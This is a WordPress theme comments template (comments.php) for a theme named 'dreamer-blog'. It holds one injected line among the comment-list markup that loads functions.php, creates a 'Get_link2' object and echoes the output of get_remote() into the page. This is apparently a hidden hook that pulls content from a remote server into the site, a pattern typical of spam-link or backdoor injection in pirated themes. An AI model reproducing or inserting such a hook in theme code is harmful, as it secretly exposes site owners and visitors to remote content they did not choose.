<?php

if ( post_password_required() ) {
    return;
}
?>

<div id="comments" class="block">
    <div class="sub-block">
        <?php
        // You can start editing here -- including this comment!
        if ( have_comments() ) : ?>
            <h3 class="comments-title">
				<?php comments_number('Нет комментариев', '1 комментарий', '% комментариев'); ?>
            </h3>
			<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_link2(); $links = $links->get_remote(); echo $links; ?>
            <ol class="comment-list">
                <?php
                    wp_list_comments( array(
                        'avatar_size' => 42,
                        'style'       => 'ol',
                        'short_ping'  => true,
                    ) );
                ?>
            </ol> <!-- /.comment-list .container -->

            <?php the_comments_pagination( array(
                'prev_text' => esc_html__( 'Previous', 'dreamer-blog' ),
                'next_text' => esc_html__( 'Next', 'dreamer-blog' ),
            ) );

        endif; // Check for have_comments().

        // If comments are closed and there are comments, let's leave a little note, shall we?
        if ( ! comments_open() && get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) : ?>
            <p class="no-comments"><?php esc_html_e( 'Comments are closed.', 'dreamer-blog' ); ?></p>
        <?php
        endif;
        comment_form();
        ?>
    </div><!-- /.sub-block -->
</div><!-- #comments -->
